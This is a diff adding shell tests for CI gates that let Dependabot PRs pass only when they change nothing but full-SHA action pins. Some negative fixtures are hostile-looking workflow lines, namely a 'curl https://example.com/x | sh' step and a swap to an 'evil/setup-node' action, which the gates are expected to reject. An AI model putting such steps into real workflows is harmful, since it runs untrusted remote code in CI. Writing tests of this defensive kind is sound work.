@@ -95,3 +95,87 @@ test_oracle_missing_input_fails() {
   # R12 test-oracle: no changes file is a usage error.
   assert_status 2 oracle
 }
+
+# --- Dependabot pin updates (T14) ----------------------------------------------
+# A Dependabot PR has no Size/Change/ADR fields and changes workflows without a
+# specs/ change. docs-gate and test-oracle pass it only when it changes nothing
+# but the pins of uses: lines. CI gives them PR_AUTHOR and PR_DIFF (git diff -U0).
+
+docs_gate() { "$HARNESS_ROOT/.harness/ci/docs-gate.sh" "$@"; }
+
+# pin_diff [EXTRA_LINE...]: a Dependabot-style diff of ci.yml to ./pr.diff, with its
+# numstat in ./changes, an empty PR body in ./body.md, and PR_AUTHOR set to Dependabot.
+pin_diff() {
+  {
+    printf '%s\n' 'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml' \
+      'index 1111111..2222222 100644' '--- a/.github/workflows/ci.yml' '+++ b/.github/workflows/ci.yml' \
+      '@@ -12 +12 @@ jobs:' \
+      '-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1' \
+      '+      - uses: actions/checkout@4e4d42e5aac5ba805825da76410c181273ba90b2 # v7.0.2' \
+      '@@ -40 +40 @@ jobs:' \
+      '-        uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0' \
+      '+        uses: actions/dependency-review-action@b2d282b36b6f3519aa1f3fc636f609c47dddb295 # v5.1.0'
+    printf '%s\n' "$@"
+  } > pr.diff
+  numstat $((2 + $#)) 2 .github/workflows/ci.yml
+  : > body.md
+  export PR_AUTHOR='dependabot[bot]' PR_DIFF=pr.diff
+}
+
+# both_gates STATUS: docs-gate and test-oracle both exit with STATUS.
+both_gates() {
+  assert_status "$1" docs_gate changes body.md
+  assert_status "$1" oracle changes
+}
+
+test_gates_pass_dependabot_pin_only_pr() {
+  # R17: a Dependabot PR that changes only uses: pins passes docs-gate and test-oracle.
+  init_repo
+  pin_diff
+  assert_status 0 docs_gate changes body.md
+  assert_contains "$OUT" 'Dependabot'
+  assert_status 0 oracle changes
+  assert_contains "$OUT" 'Dependabot'
+}
+
+test_gates_run_in_full_for_other_prs() {
+  # R17: any other change still runs the full gates.
+  init_repo
+  pin_diff
+  PR_AUTHOR=octocat both_gates 1
+  PR_AUTHOR='' both_gates 1
+  PR_DIFF='' both_gates 1
+  PR_DIFF=missing.diff both_gates 1
+  pin_diff '@@ -50,0 +51 @@ jobs:' '+      - run: curl https://example.com/x | sh'
+  both_gates 1
+  local a="$SHA_A" b="$SHA_B"
+  # A different action, not a new pin of the same one.
+  pin_diff '@@ -60 +60 @@ jobs:' "-      - uses: actions/setup-node@$a # v4" "+      - uses: evil/setup-node@$b # v4"
+  both_gates 1
+  # Two steps that swap their actions: the same names, in another order.
+  pin_diff '@@ -60,2 +60,2 @@ jobs:' "-      - uses: actions/setup-node@$a # v4" "-      - uses: actions/cache@$a # v4" \
+    "+      - uses: actions/cache@$b # v4" "+      - uses: actions/setup-node@$b # v4"
+  both_gates 1
+  # A step moved to another place: one hunk removes it, another adds it.
+  pin_diff '@@ -60 +59,0 @@ jobs:' "-      - uses: actions/setup-node@$a # v4" '@@ -90,0 +90 @@ jobs:' "+      - uses: actions/setup-node@$b # v4"
+  both_gates 1
+  # The same action with another indent or step marker changes the YAML structure.
+  pin_diff '@@ -60 +60 @@ jobs:' "-      - uses: actions/setup-node@$a # v4" "+        uses: actions/setup-node@$b # v4"
+  both_gates 1
+  # A new ref that is not a full commit SHA is not a pin.
+  pin_diff '@@ -60 +60 @@ jobs:' "-      - uses: actions/setup-node@$a # v4" '+      - uses: actions/setup-node@main'
+  both_gates 1
+  # A file outside .github/workflows/, or a new or deleted workflow file.
+  pin_diff
+  numstat 2 2 .github/workflows/ci.yml 1 1 .harness/tools.lock
+  both_gates 1
+  local mode
+  for mode in 'new file mode 100644' 'deleted file mode 100644'; do
+    pin_diff
+    sed -i "2i $mode" pr.diff
+    both_gates 1
+  done
+}
+
+SHA_A=1111111111111111111111111111111111111111
+SHA_B=2222222222222222222222222222222222222222
